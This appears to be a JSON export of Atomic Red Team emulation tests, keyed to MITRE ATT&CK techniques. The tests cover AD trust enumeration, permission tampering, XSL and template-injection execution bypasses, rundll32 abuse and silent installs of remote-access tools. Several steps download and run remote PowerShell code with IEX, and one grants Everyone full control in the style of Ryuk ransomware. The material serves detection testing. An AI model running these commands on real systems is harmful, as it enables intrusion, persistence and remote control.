"tags": []}, {"data": {"name": "Powershell enumerate domains and forests", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Import-Module \"$env:TEMP\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u", "clacwm1qb00b629mq9sltclhe"], "tags": []}, {"data": {"name": "Get-ForestTrust with PowerView", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u"], "tags": []}, {"data": {"name": "Get-DomainTrust with PowerView", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Trusts", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -gcb -sc trustdmp\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u", "clacwm1qb00b629mq9sltclhe"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory OUs", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -f (objectcategory=organizationalUnit)\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u", "clacwm1qb00b629mq9sltclhe"], "tags": []}, {"data": {"name": "Chown through c script", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "chowns a file to root using a c script\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | source_file | Path of c source file | Path | PathToAtomicsFolder/T1222.002/src/chown.c | \n | compiled_file | Path of compiled file | Path | /tmp/T1222002own | "}, "executionSteps": [{"description": "sudo #{compiled_file} #{source_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v"], "tags": []}, {"data": {"name": "chown - Change file or folder ownership recursively", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's ownership only recursively using chown.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | owner | Username of desired owner | String | root | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | "}, "executionSteps": [{"description": "chown -R #{owner} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chown - Change file or folder ownership and group recursively", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's ownership and group information recursively using chown.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | owner | Username of desired owner | String | root | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | \n | group | Group name of desired group | String | root | "}, "executionSteps": [{"description": "chown -R #{owner}:#{group} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chown - Change file or folder ownership and group", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's ownership and group information using chown.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | owner | Username of desired owner | String | root | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml | \n | group | Group name of desired group | String | root | "}, "executionSteps": [{"description": "chown #{owner}:#{group} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chown - Change file or folder mode ownership only", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's ownership only using chown.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | owner | Username of desired owner | String | root | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml | "}, "executionSteps": [{"description": "chown #{owner} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "Chmod through c script", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "chmods a file using a c script\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | source_file | Path of c source file | Path | PathToAtomicsFolder/T1222.002/src/T1222.002.c | \n | compiled_file | Path of compiled file | Path | /tmp/T1222002 | "}, "executionSteps": [{"description": "#{compiled_file} /tmp/ T1222002\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v"], "tags": []}, {"data": {"name": "chmod - Change file or folder mode (symbolic mode) recursively", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | symbolic_mode | Specified symbolic mode value | String | a+w | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | "}, "executionSteps": [{"description": "chmod -R #{symbolic_mode} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chmod - Change file or folder mode (symbolic mode)", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | symbolic_mode | Specified symbolic mode value | String | a+w | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | "}, "executionSteps": [{"description": "chmod #{symbolic_mode} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chmod - Change file or folder mode (numeric mode) recursively", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | numeric_mode | Specified numeric mode value | Integer | 755 | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | "}, "executionSteps": [{"description": "chmod -R #{numeric_mode} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chmod - Change file or folder mode (numeric mode)", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | numeric_mode | Specified numeric mode value | Integer | 755 | \n | file_or_folder | Path of the file or folder | Path | /tmp/AtomicRedTeam/atomics/T1222.002 | "}, "executionSteps": [{"description": "chmod #{numeric_mode} #{file_or_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "chattr - Remove immutable file attribute", "shortName": "T1222.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_modify | Path of the file | Path | /var/spool/cron/root | "}, "executionSteps": [{"description": "chattr -i #{file_to_modify}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pz02oj29mq9rll3e3v", "clacwm21v00iu29mqfr8l9bh1"], "tags": []}, {"data": {"name": "Take ownership using takeown utility", "shortName": "T1222.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_folder_to_own | Path of the file or folder for takeown to take ownership. | Path | %temp%\\T1222.001_takeown_folder | "}, "executionSteps": [{"description": "takeown.exe /f #{file_folder_to_own} /r\n", "successCriteria": null}], "techniqueIds": ["clacwm5yp02xe29mq63840g1n", "clacwm2md010a29mqg7jc80ij"], "tags": []}, {"data": {"name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style", "shortName": "T1222.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path | Path of folder to recursively set permissions on | Path | C:\\Users\\Public\\* | \n | file_path | Path of folder permission back | Path | %temp%\\T1222.001-folder-perms-backup.txt | "}, "executionSteps": [{"description": "icacls \"#{path}\" /grant Everyone:F /T /C /Q", "successCriteria": null}], "techniqueIds": ["clacwm5yp02xe29mq63840g1n", "clacwm2md010a29mqg7jc80ij"], "tags": []}, {"data": {"name": "cacls - Grant permission to specified user or group recursively", "shortName": "T1222.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_or_folder | Path of the file or folder to change permissions. | Path | %temp%\\T1222.001_cacls | \n | user_or_group | User or group to allow full control | String | Everyone | "}, "executionSteps": [{"description": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n", "successCriteria": null}], "techniqueIds": ["clacwm5yp02xe29mq63840g1n", "clacwm2md010a29mqg7jc80ij"], "tags": []}, {"data": {"name": "attrib - Remove read-only attribute", "shortName": "T1222.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_or_folder | Path of the file or folder remove attribute. | Path | %temp%\\T1222.001_attrib | "}, "executionSteps": [{"description": "attrib.exe -r #{file_or_folder}\\*.* /s\n", "successCriteria": null}], "techniqueIds": ["clacwm5yp02xe29mq63840g1n", "clacwm2md010a29mqg7jc80ij"], "tags": []}, {"data": {"name": "attrib - hide file", "shortName": "T1222.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_or_folder | Path of the files to hide. | Path | %temp%\\T1222.001_attrib_2 | "}, "executionSteps": [{"description": "mkdir #{file_or_folder} >nul 2>&1\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib2.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5yp02xe29mq63840g1n", "clacwm2md010a29mqg7jc80ij"], "tags": []}, {"data": {"name": "WINWORD Remote Template Injection", "shortName": "T1221", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | docx_file | Location of the test docx file on the local filesystem. | Path | PathToAtomicsFolder\\T1221\\src\\Calculator.docx | "}, "executionSteps": [{"description": "start #{docx_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6pt03qk29mq7ozm4lgr", "clacwm2iz00wy29mq392cb173"], "tags": []}, {"data": {"name": "WMIC bypass using remote XSL file", "shortName": "T1220", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_xsl_file | Remote location of an XSL payload. | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl | \n | wmic_command | WMI command to execute using wmic.exe | String | process list | "}, "executionSteps": [{"description": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6s003t829mqffsr5amz", "clacwm2mr010s29mqhxcn10dq"], "tags": []}, {"data": {"name": "WMIC bypass using local XSL file", "shortName": "T1220", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code specified within a XSL script using a local payload.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | wmic_command | WMI command to execute using wmic.exe | String | process list | \n | local_xsl_file | Location of the test XSL script file on the local filesystem. | Path | PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl | "}, "executionSteps": [{"description": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6s003t829mqffsr5amz", "clacwm2mr010s29mqhxcn10dq"], "tags": []}, {"data": {"name": "MSXSL Bypass using remote files", "shortName": "T1220", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xmlfile | Remote location (URL) of the test XML file. | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml | \n | xslfile | Remote location (URL) of the test XSL script file. | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl | \n | msxsl_exe | Location of the MSXSL executable. | Path | PathToAtomicsFolder\\T1220\\bin\\msxsl.exe | "}, "executionSteps": [{"description": "#{msxsl_exe} #{xmlfile} #{xslfile}\n", "successCriteria": null}], "techniqueIds": ["clacwm6s003t829mqffsr5amz", "clacwm2mr010s29mqhxcn10dq"], "tags": []}, {"data": {"name": "MSXSL Bypass using local files", "shortName": "T1220", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xmlfile | Location of the test XML file on the local filesystem. | Path | PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml | \n | xslfile | Location of the test XSL script file on the local filesystem. | Path | PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl | \n | msxsl_exe | Location of the MSXSL executable. | Path | PathToAtomicsFolder\\T1220\\bin\\msxsl.exe | "}, "executionSteps": [{"description": "#{msxsl_exe} #{xmlfile} #{xslfile}\n", "successCriteria": null}], "techniqueIds": ["clacwm6s003t829mqffsr5amz", "clacwm2mr010s29mqhxcn10dq"], "tags": []}, {"data": {"name": "UltraViewer - RAT Execution", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | UltraViewer_Path | Path to the UltraViewer executable. | Path | $env:temp\\T1219Setup.exe | "}, "executionSteps": [{"description": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "TeamViewer Files Detected Test on Windows", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0", "clacwm2bk00qm29mqcmvbamu9"], "tags": []}, {"data": {"name": "ScreenConnect Application Download and Install on Windows", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"\nmsiexec /i $installer /qn\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "RemotePC Software Execution", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | RemotePC_Path | Path of RemotePC executable | Path | $env:temp\\RemotePC.exe | "}, "executionSteps": [{"description": "Start-Process #{RemotePC_Path}\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "NetSupport - RAT Execution", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | NetSupport_Path | Path to the NetSupport executable. | Path | $env:temp\\T1219Setup.exe | "}, "executionSteps": [{"description": "Start-Process #{NetSupport_Path} -ArgumentList \"/S /v/qn\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "LogMeIn Files Detected Test on Windows", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0", "clacwm2bk00qm29mqcmvbamu9"], "tags": []}, {"data": {"name": "GoToAssist Files Detected Test on Windows", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "AnyDesk Files Detected Test on Windows", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0", "clacwm2bk00qm29mqcmvbamu9"], "tags": []}, {"data": {"name": "Ammyy Admin Software Execution", "shortName": "T1219", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Ammyy_Admin_Path | Path of Ammyy Admin executable | Path | $env:temp\\ammyy.exe | "}, "executionSteps": [{"description": "Start-Process #{Ammyy_Admin_Path}\n", "successCriteria": null}], "techniqueIds": ["clacwm61002zo29mq8ul1f2u0"], "tags": []}, {"data": {"name": "Rundll32 with Ordinal Value", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_url | Url to download the DLL | Url | https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll | \n | input_file | DLL File | String | PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll | "}, "executionSteps": [{"description": "rundll32.exe #{input_file},#2\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv"], "tags": []}, {"data": {"name": "Rundll32 with desk.cpl", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_to_launch | Path of the executable to launch | Path | %windir%\\System32\\calc.exe | "}, "executionSteps": [{"description": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv"], "tags": []}, {"data": {"name": "Rundll32 with Control_RunDLL", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to 